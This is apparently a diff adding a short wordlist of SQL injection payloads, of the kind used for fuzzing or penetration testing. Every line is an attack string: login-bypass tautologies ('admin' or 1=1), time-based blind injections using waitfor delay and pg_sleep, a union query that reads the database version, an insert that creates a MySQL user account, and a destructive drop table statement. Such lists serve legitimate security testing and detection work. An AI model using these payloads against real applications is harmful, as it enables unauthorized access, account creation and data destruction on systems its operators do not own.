@@ -1,0 +1,11 @@
+select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1
+"admin"" or ""1"" = ""1""--"
+"admin"" or 1 = 1"
+    >>> select * from users where username="admin" or "1"="1" and password=md5("<<password>>")
+"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  "
+) ;waitfor delay '0:0:__TIME__'--
+' union  ( select @@version )  --
+or pg_sleep ( __TIME__ ) --
+or 'something'  =  'some'+'thing'
+' ; drop table temp --
+x' AND email IS NULL; --
